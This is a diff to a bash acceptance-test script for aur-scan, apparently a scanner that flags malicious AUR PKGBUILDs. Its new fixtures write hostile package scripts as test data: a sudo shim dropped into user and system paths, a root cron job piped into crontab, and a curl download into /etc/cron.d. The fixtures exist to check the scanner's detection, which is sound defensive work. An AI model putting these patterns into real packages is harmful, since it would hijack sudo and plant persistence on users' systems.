@@ -205,8 +205,19 @@ OUT=$(fish -c 'source /usr/share/fish/vendor_completions.d/aur-scan.fish; and ec
 grep -q LOADED <<<"$OUT" && pass "fish completions load" || fail "fish completions failed: $OUT"
 
 sect "Every documented command runs (README: Command Reference)"
+# Derive the expected version from the tree under test rather than hardcoding
+# it. A literal here goes stale at every release and then reports a failure
+# that says nothing about the build -- which is exactly what it did from 2.1.0
+# to 2.2.0-rc.1.
+WANT_V=$(sed -n '/^\[workspace\.package\]/,/^\[/ s/^version *= *"\(.*\)"/\1/p' "$SRC/Cargo.toml" | head -1)
 V=$(aur-scan --version 2>&1)
-[[ $V == "aur-scan 2.1.0" ]] && pass "version reports 2.1.0" || fail "version: '$V'"
+if [[ -z $WANT_V ]]; then
+    fail "could not read the workspace version from Cargo.toml"
+elif [[ $V == "aur-scan $WANT_V" ]]; then
+    pass "version reports $WANT_V (matches Cargo.toml)"
+else
+    fail "version: '$V' (expected 'aur-scan $WANT_V' from Cargo.toml)"
+fi
 ok "aur-scan --help"            aur-scan --help
 ok "aur-scan scan --help"       aur-scan scan --help
 ok "aur-scan check --help"      aur-scan check --help
@@ -454,15 +465,35 @@ grep_not "same package with NO owned_namespaces is silent" "namespace you own" \
     aur-scan check --local /tmp/ns/aur-scanner-bin --no-confirm --no-deps
 
 sect "Config handling"
+# The probe for "is a bad config a hard error?" MUST be a real scanning path.
+# These checks used `codes`, which is now a deliberately tolerant reference
+# command -- so they were asserting the fail-closed contract against a command
+# exempt from it, and would have gone green for the wrong reason.
+mkdir -p /tmp/ns/cfgpkg
+printf 'pkgname=cfgprobe\npkgver=1.0\npkgrel=1\narch=(x86_64)\n' > /tmp/ns/cfgpkg/PKGBUILD
 echo 'min_severity = "high"' > /tmp/ns/ok.toml
-ok "valid config loads" aur-scan -c /tmp/ns/ok.toml codes
+ok "valid config loads" aur-scan -c /tmp/ns/ok.toml scan /tmp/ns/cfgpkg
 echo 'this is not = = valid [[[' > /tmp/ns/bad.toml
-aur-scan -c /tmp/ns/bad.toml codes >/dev/null 2>&1 && fail "malformed config must be a hard error" || pass "malformed config is a hard error"
+aur-scan -c /tmp/ns/bad.toml scan /tmp/ns/cfgpkg >/dev/null 2>&1 && fail "malformed config must be a hard error" || pass "malformed config is a hard error"
 printf '[output]\nline_numbers = true\n' > /tmp/ns/typo.toml
-aur-scan -c /tmp/ns/typo.toml codes >/dev/null 2>&1 && fail "mistyped [output] key must be rejected" || pass "mistyped [output] key is rejected"
+aur-scan -c /tmp/ns/typo.toml scan /tmp/ns/cfgpkg >/dev/null 2>&1 && fail "mistyped [output] key must be rejected" || pass "mistyped [output] key is rejected"
 echo 'enable_thret_intel = true' > /tmp/ns/typo2.toml
-aur-scan -c /tmp/ns/typo2.toml codes >/dev/null 2>&1 && fail "mistyped top-level key must be rejected" || pass "mistyped top-level key is rejected"
+aur-scan -c /tmp/ns/typo2.toml scan /tmp/ns/cfgpkg >/dev/null 2>&1 && fail "mistyped top-level key must be rejected" || pass "mistyped top-level key is rejected"
 aur-scan -c /tmp/ns/bad.toml completions bash >/dev/null 2>&1 && pass "completions work despite a bad config" || fail "completions blocked by bad config"
+# ...and the commands you would reach for to DIAGNOSE that bad config must
+# still run. They read nothing but the built-in rule table, so hard-failing
+# them was pure collateral damage from the fail-closed posture scanning needs.
+for c in "explain SHELL-002" "rules" "ioc" "codes"; do
+    # shellcheck disable=SC2086
+    if aur-scan -c /tmp/ns/bad.toml $c >/dev/null 2>&1; then
+        pass "'aur-scan $c' survives a broken config"
+    else
+        fail "'aur-scan $c' blocked by a broken config"
+    fi
+done
+# `codes` honours rules_path, so degrading must be VISIBLE rather than silent.
+grep_ok "codes warns that rules_path was not honoured" "rules_path" \
+    aur-scan -c /tmp/ns/bad.toml codes
 
 sect "Live AUR (network)"
 if timeout 180 aur-scan check yay-bin --no-confirm --no-deps >/tmp/check.log 2>&1; then
@@ -501,6 +532,107 @@ rc=$?
 [[ $rc -ne 0 ]] && pass "aur-scan-wrap fails closed on an unusable invocation (exit $rc)" || fail "aur-scan-wrap exited 0 on a bogus invocation"
 ok "aur-scan-hook --help"  aur-scan-hook --help
 
+# The hook runs as ROOT under pacman and must never take its security config
+# from a user-writable file. It resolves config before it can drop privileges
+# (/etc may be root-readable only), so the lookup itself has to exclude the
+# user path. Proof: plant deliberately broken TOML where the CLI would find it,
+# then confirm the hook is unaffected while the CLI is not.
+#
+# The hook is invoked with HOME and XDG_CONFIG_HOME PRESERVED, via `sudo env`.
+# Plain `sudo` is not a valid probe here: Arch's default sudoers resets HOME to
+# /root and strips XDG_CONFIG_HOME, so the user path is unreachable and the
+# check passes whether or not the bug is present -- it did exactly that on the
+# first attempt. Preserving them is the real condition, and it is an ordinary
+# one: a root shell from `su` without `-`, `sudo -E`, or doas with keepenv all
+# leave the invoking user's HOME in place. Verified to exit 2 on the
+# pre-fix binary and 0 after.
+mkdir -p "$HOME/.config/aur-scanner"
+HOOKCFG="$HOME/.config/aur-scanner/config.toml"
+[[ -f $HOOKCFG ]] && cp "$HOOKCFG" "$HOOKCFG.acceptance-backup"
+echo 'this is not = = valid [[[' > "$HOOKCFG"
+# Sanity: the USER-level CLI really does honour that path, so a pass below is
+# an exemption and not the file being ignored by everyone.
+if aur-scan scan /tmp/ns/cfgpkg >/dev/null 2>&1; then
+    fail "user config path is not honoured by the CLI -- hook check would prove nothing"
+else
+    pass "user config path IS honoured by the unprivileged CLI (control)"
+fi
+for keep in "HOME=$HOME" "XDG_CONFIG_HOME=$HOME/.config"; do
+    echo firefox | sudo env "$keep" /usr/bin/aur-scan-hook >/tmp/hookcfg.log 2>&1
+    hrc=$?
+    if [[ $hrc -eq 2 ]]; then
+        fail "root hook read the USER-writable config with $keep (exit 2) -- any user can wedge pacman"
+        sed 's/^/          /' /tmp/hookcfg.log | tail -5
+    else
+        pass "root hook ignores a user-writable config with $keep (exit $hrc, not 2)"
+    fi
+done
+rm -f "$HOOKCFG"
+[[ -f $HOOKCFG.acceptance-backup ]] && mv "$HOOKCFG.acceptance-backup" "$HOOKCFG"
+
+sect "Review fixes: detection gaps closed in the rule engine"
+mkdir -p /tmp/rf
+# ATOMIC-004: the sudo shim written destination-LAST, which is how every real
+# command is written. Critical, and the hook fails closed on it.
+cat > /tmp/rf/PKGBUILD <<'PKG'
+pkgname=shimtest
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+package() {
+  install -Dm755 stealer "$HOME/.local/bin/sudo"
+  cp payload /usr/local/bin/sudo
+}
+PKG
+grep_ok "ATOMIC-004 catches a sudo shim named last" "ATOMIC-004" aur-scan scan /tmp/rf
+# PERSIST-003: piped-stdin crontab, the standard non-interactive install form.
+cat > /tmp/rf/PKGBUILD <<'PKG'
+pkgname=crontest
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+package() {
+  echo '* * * * * root /opt/x' | crontab -
+}
+PKG
+grep_ok "PERSIST-003 catches '| crontab -'" "PERSIST-003" aur-scan scan /tmp/rf
+# PERSIST-003: a redirect from something other than echo/printf/cat.
+cat > /tmp/rf/PKGBUILD <<'PKG'
+pkgname=crontest2
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+package() {
+  curl -s https://example.invalid/c > /etc/cron.d/pkg
+  ln -s /opt/pkg/evil.cron /etc/cron.d/pkg2
+}
+PKG
+grep_ok "PERSIST-003 catches a non-printer redirect and ln -s" "PERSIST-003" aur-scan scan /tmp/rf
+# ...and the issue #21 guarantee still holds: cleanup stays silent, including
+# when the line does more than one thing.
+cat > /tmp/rf/PKGBUILD <<'PKG'
+pkgname=cronclean
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+pkgdesc="Crontab module for python"
+package() {
+  echo done > /dev/null; rm -f /etc/cron.daily/pkg
+}
+PKG
+grep_not "PERSIST-003 stays silent on cleanup and on prose" "PERSIST-003" aur-scan scan /tmp/rf
+# The real sudo package must not trip a Critical.
+cat > /tmp/rf/PKGBUILD <<'PKG'
+pkgname=sudo
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+package() {
+  install -Dm4755 sudo "$pkgdir/usr/bin/sudo"
+  cp "$srcdir/sudo.conf" "$pkgdir/etc/sudo.conf"
+}
+PKG
+grep_not "ATOMIC-004 does not fire on the real sudo package" "ATOMIC-004" aur-scan scan /tmp/rf
 
 sect "aur-scan diff (change detection, explicit)"
 rm -rf /tmp/dt && mkdir -p /tmp/dt/v1 /tmp/dt/v2
